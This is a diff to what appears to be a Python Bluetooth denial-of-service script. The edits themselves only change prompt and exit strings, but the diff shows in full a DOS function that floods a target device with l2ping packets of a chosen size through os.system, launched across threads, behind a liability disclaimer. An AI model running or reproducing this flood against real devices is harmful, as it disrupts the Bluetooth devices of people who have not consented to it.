@@ -2,6 +2,7 @@ import os
 import threading
 import time
 import subprocess
+
 def DOS(target_addr, packages_size):
     os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
@@ -12,7 +13,7 @@ def main():
     time.sleep(0.1)
     print('')
     print('THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
-    if (input("Go? (y/n) > ") in ['y', 'Y']):
+    if (input("Ready? (y/n) > ") in ['y', 'Y']):
         time.sleep(0.1)
         os.system('clear')
         printLogo()
@@ -69,7 +70,7 @@ def main():
         print('[*] Built all threads...')
         print('[*] Starting...')
     else:
-        print('Bip bip')
+        print('FU FU')
         exit(0)
 
 if __name__ == '__main__':
